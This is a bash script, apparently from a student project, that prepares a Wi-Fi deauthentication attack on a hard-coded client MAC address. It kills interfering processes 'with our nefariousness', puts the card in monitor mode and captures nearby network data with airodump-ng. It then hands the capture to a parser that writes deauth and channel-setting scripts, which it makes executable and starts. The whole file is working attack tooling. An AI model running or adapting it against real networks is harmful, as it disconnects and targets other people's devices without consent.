#!/bin/bash

IFACE='wlan0'
CLIENT='6C:56:97:71:83:33'

# kill processes that might interfere
# with our nefariousness
airmon-ng check kill

# put the device in monitor mode, stop existing monitor mode device
airmon-ng stop mon0
airmon-ng start $IFACE

# run airodump for 60 seconds, dump output to csv
# needs to run in the foreground do to bug in airodump 1.2rc4
# see security.stackexchange.com/questions/169629/running-airodump-ng-from-script
timeout --foreground 60s airodump-ng --write out --output-format csv mon0

echo "Done with capturing surrounding network info, parsing...\n"
# run the python script to parse our csv output
# sorry mickens I didn't actually learn bash scripting
# prepends an -01 to the csv so we call our python script on that
python parse.py --mac $CLIENT --src out-01.csv --iface $IFACE

# remove the file for successive iterations of the script
rm -rf out-01.csv

echo "Done parsing\n"
# change permissions on the files (hopefully) written by python
# script, need to do error checking
chmod +x deauth.sh
chmod +x set_channel.sh

# set the channel, prepared to call deauth whenever
./set_channel.sh


